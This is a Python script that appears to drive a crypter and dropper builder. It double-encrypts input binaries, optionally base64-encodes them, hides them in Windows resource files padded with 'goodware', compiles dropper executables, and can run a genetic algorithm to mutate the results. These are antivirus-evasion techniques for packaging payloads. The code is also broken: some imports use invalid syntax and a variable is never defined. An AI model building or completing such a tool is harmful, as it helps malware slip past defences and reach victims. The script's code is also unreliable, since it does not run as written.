import os
import subprocess
import argparse
import random
import shutil
import CreateCrypt #creates an encrypt and decrypt function 
# encryptFile(const std::string&inputFile, const std::string& outputFile, char key)
# void decryptFile(const std::string& inputFile, const std::string& outputFile, char key)
#saves to generated/crypt
from pathlib import Path
import EnsureGAdockerRunning.py
import base64
import CreateDropper
import GenerateRES
import BuildExes
import ../GeneticPart/Genetic.py as Gene
#make sure all needed folders are here
base_dirs = {
    "crypt": "generated/crypt",
    "encrypted_binaries": "generated/encrypted_binaries",
    "double_encrypted_binaries": "generated/double_encrypted_binaries",
    "resfiles": "generated/resfiles",
    "Generated_DropperCPPfiles": "generated/Generated_DropperCPPfiles",
    "finalexes": "generated/finalexes",
    "base64encrypted":"generated/base64encrypted"
}

# Ensure all folders exist
for name, path in base_dirs.items():
    os.makedirs(path, exist_ok=True)

# Clear all folders except 'crypt'
for name, path in base_dirs.items():
    if name == "crypt":
        continue  # do not clear crypt
    # Remove all files in the folder
    for f in os.listdir(path):
        file_path = os.path.join(path, f)
        try:
            if os.path.isfile(file_path) or os.path.islink(file_path):
                os.remove(file_path)
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
        except Exception as e:
            print(f"⚠️ Could not remove {file_path}: {e}")

parser = argparse.ArgumentParser(description="Full pipeline of encrypting and decrypting")
parser.add_argument("--binaries", "--b", nargs="+", required=True, help="List of binaries or folders to encrypt")
parser.add_argument("--EncryptCount","--e", type=int, default=1, help="How many times to generate encryption types")
parser.add_argument("--key", type=int, default=random.randint(1, 255), help="Encryption key")
parser.add_argument("--genetic","--g",type=int,default=0,help = "apply the genetic algo to the binary")
parser.add_argument("--extrareasorces","--eg", type=int,default =0, help = "how much extragoodware to append to reasorces")
parser.add_argument("--base64",type = int,default=0,help="add base64 encoding to the binary")
args = parser.parse_args()

binaries = args.binaries
key = args.key
encrypt_count = args.EncryptCount
extragoodware = args.extrareasorces
genetic = args.genetic
b64 = args.base64

for i in range(encrypt_count): #generates encrypt_count different encryption scripts in generated/crypt             1 create the enryptions 
    CreateCrypt.create_crypt()

cpp_files = [f for f in os.listdir( "generated/crypt") if f.endswith(".cpp")] #get a random encrypt file            2Run the encryptions outputs to generated/encrypted_binaries
if not cpp_files:
    raise FileNotFoundError("No C++ files found in generated/crypt!")

cpp_file1 = os.path.join( "generated/crypt", random.choice(cpp_files))

encrypt_script = os.path.join(os.path.dirname(__file__), "encrypt.py")  
cmd = [
    "python3",
    encrypt_script, #this overrides the main function in the c++ script and runs just the encrypt
    "--cpp", cpp_file1,
    "--key", str(key),
]
cmd.extend(["--binaries"] + binaries)
result = subprocess.run(cmd, capture_output=True, text=True)

if result.returncode != 0:
    print(f"❌ Encryption script failed:\n{result.stderr}")
else:
    print(f"✅ Encryption script ran successfully:\n{result.stdout}")
print(cpp_file1)
first_output_folder = os.path.join(os.path.dirname(__file__), "generated/encrypted_binaries")

# Collect the outputs of the first encryption to feed into the second one
encrypted_files = [
    os.path.join(first_output_folder, f)
    for f in os.listdir(first_output_folder)
    if os.path.isfile(os.path.join(first_output_folder, f))
]

if not encrypted_files:
    print("❌ No encrypted files found after first encryption.")
    raise SystemExit(1)

# --- SECOND ENCRYPTION PASS ---
second_output_folder = os.path.join(os.path.dirname(__file__), "generated/double_encrypted_binaries")
cpp_file2 = os.path.join("generated/crypt", random.choice(cpp_files))

cmd = [
    "python3",
    encrypt_script,
    "--cpp", cpp_file2,
    "--key", str(key),
    "--output", str(second_output_folder)
]
cmd.extend(["--binaries"] + encrypted_files)

result = subprocess.run(cmd, capture_output=True, text=True)

if result.returncode != 0:
    print(f"❌ Second encryption failed:\n{result.stderr}")
    raise SystemExit(1)
else:
    print(f"✅ Second encryption ran successfully:\n{result.stdout}")

print("Second encryptor used:", cpp_file2)

double_enc_dir = Path("generated/double_encrypted_binaries")                                             #base64 encode if needed
base64_dir = Path("generated/base64encrypted")
                                                     
if b64:
    base64_dir.mkdir(parents=True, exist_ok=True)

    for file in double_enc_dir.iterdir():
        if file.is_file():
            out_file = base64_dir / f"{file.name}.b64"

            with open(file, "rb") as f:
                encoded = base64.b64encode(f.read())

            with open(out_file, "wb") as f:
                f.write(encoded)

            print(f"📄 Base64 encoded: {out_file}")

    working_binary_dir = base64_dir

else:
    working_binary_dir = double_enc_dir
                                                                                                                        #3 make the res.rc folders
GenerateRES.generate_all_resources(str(working_binary_dir),"generated/resfiles",extragoodware )


for rc_file in os.listdir("generated/resfiles"):                                                                        #4 make all the droppers
    if rc_file.endswith(".rc"):
        base_name = os.path.splitext(rc_file)[0]  
        dropper_cpp_path = os.path.join("generated/Generated_DropperCPPfiles", f"{base_name}.cpp")

        cpp_content = f"""// Auto-generated dropper for {rc_file}
            #include <windows.h>
            #include <iostream>

            // Placeholder main function
            int main() {{
                std::cout << "Dropper for {rc_file}" << std::endl;
                return 0;
            }}
            """

       
        with open(dropper_cpp_path, "w", encoding="utf-8") as f:
            f.write(cpp_content)

        print(f"✅ Created dropper CPP: {dropper_cpp_path}")

        CreateDropper.create_dropper(dropper_cpp_path, cpp_file1, cpp_file2, key, key,b64)

BuildExes.build_all("generated/Generated_DropperCPPfiles", "generated/resfiles","generated/finalexes")                    # compile all the droppers with their needed res
if(genetic):
    mutatableSections = [101 + i for i in range(1,extragoodware)]
    EnsureGAdockerRunning.ensure_container_running()

    Gene.genetic_algo(4,8,exe_path,"../GeneticPart/goodware/",exe_path,mutatableSections)
    